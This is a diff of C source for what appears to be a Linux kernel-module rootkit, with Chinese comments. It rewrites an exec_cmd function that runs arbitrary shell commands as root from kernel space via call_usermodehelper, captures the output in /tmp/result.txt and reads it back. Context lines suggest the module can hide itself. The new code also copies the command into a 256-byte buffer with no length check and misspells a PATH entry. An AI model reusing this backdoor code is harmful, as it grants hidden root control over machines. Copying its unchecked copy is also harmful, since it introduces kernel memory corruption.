@@ -113,33 +113,35 @@ static void show_myself(void)
     // kobject_put(&mod.mkobj.kobj);
 }
 
-// 命令执行，测试模块
-static char *exec_cmd(char cmd[1024])
+// 命令执行模块
+static char *exec_cmd(char *cmd)
 {
-    // 可以创建文件，但是似乎出现了些许问题
+    int result;
+    loff_t pos;
     struct file *fp;
-    char cmd_path[] = "/bin/sh";
-    // char output[] = " > /tmp/result.txt";
-    // strcat(cmd, output);
-    char *cmd_argv[] = {cmd_path, "-c", cmd, NULL};
-    char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL};
-    call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_PROC);
-    return 0;
+    static char buf[1024];
+    char *cmd_path = "/bin/sh";
+    char *output = " > /tmp/result.txt";
+    char *tmp = kmalloc(256, GFP_KERNEL);
+    strcpy(tmp, cmd);
+    strcat(tmp, output);
+    char *cmd_argv[] = {cmd_path, "-c", tmp, NULL};
+    char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/user/bin", NULL};
+    result = call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_PROC);
+    pr_info("[TestKthread]: call_usermodehelper() result is %d\n", result);
+    kfree(tmp);
 
-    // fp = filp_open("/tmp/result.txt", O_RDWR | O_CREAT, 0644);
-    // if (IS_ERR(fp))
-    // {
-    //     pr_info("open file failed!");
-    //     return 0;
-    // }
-    // return 0;
-    // memset(buf, 0, sizeof(buf));
-    // pos = 0;
-    // int old_fs = get_fs();
-    // set_fs(get_ds());
-    // vfs_read(fp, buf, sizeof(buf), &pos);
-    // pr_info("%s\n", buf);
-    // filp_close(fp, NULL);
-    // set_fs(old_fs);
-    // return buf;
+    fp = filp_open("/tmp/result.txt", O_RDWR | O_CREAT, 0644);
+    if (IS_ERR(fp))
+    {
+        pr_info("open file failed!");
+        return 0;
+    }
+    memset(buf, 0, sizeof(buf));
+    pos = 0;
+    kernel_read(fp, buf, sizeof(buf), &pos);
+    pr_info("shell result %ld:\n", strlen(buf));
+    pr_info("%s\n", buf);
+    filp_close(fp, NULL);
+    return buf;
 }
